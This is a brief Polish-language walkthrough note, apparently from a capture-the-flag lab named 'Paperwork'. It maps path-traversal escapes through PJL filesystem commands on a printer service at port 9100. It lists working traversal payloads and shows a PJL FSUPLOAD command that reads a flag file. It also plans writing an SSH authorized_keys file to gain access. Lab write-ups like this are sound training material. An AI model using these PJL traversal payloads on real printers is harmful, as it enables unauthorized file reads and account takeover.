# PJL — location escape (Paperwork)

## Baza ścieżek (sandbox jetdirect)

CWD serwisu: **`/home/archivist/printer/`**.

| Ścieżka w `NAME=` | FSQUERY | Zapis klucza |
|-------------------|---------|--------------|
| `..` | listing **home archivist** (user.txt, .ssh) | — |
| `../.ssh/authorized_keys` | plik SIZE=0 | echo SIZE=0, body nie wchodzi (FSUPLOAD) |
| `../user.txt` | SIZE=33 | **FSUPLOAD+SIZE = odczyt treści** |
| `/home/archivist/...` | **FILEERROR** | **FILEERROR** |
| `....//....//home/...` | **FILEERROR** | **FILEERROR** |
| `logs/../../.ssh/...` | akceptowane | jak `../.ssh` (puste) |
| `0:../.ssh` | działa listing | `0:../.ssh/authorized_keys` echo SIZE=0 |
| `.` | printer + logs | — |

**Wniosek:** escape to **`../`** (i ewentualnie `logs/../..` / `0:`), **nie** ścieżki absolutne ani podwójne `....//`.

## Semantyka komend (odwrócona)

- **`FSUPLOAD`** + `NAME` + `SIZE` → **odczyt** pliku (body w odpowiedzi).
- **Zapis** klucza: testować **`FSDOWNLOAD` / `FSAPPEND`** (stepwise: linia NAME → recv → `SIZE=n` → recv → body).

Przykład **user flag** (jako `lp`, port 9100):

```text
@PJL FSUPLOAD NAME="../user.txt"\r\n
SIZE=33\r\n
```

Odpowiedź zawiera linię echo + **33 bajty** pliku (log: `loot/lpd-callback.log` `/pescape`).

## WWW location escape

`nginx` → Flask `:1337` — typowe `../` w URL **nie** dają LFI (404/400). Wektor to **PJL**, nie HTTP.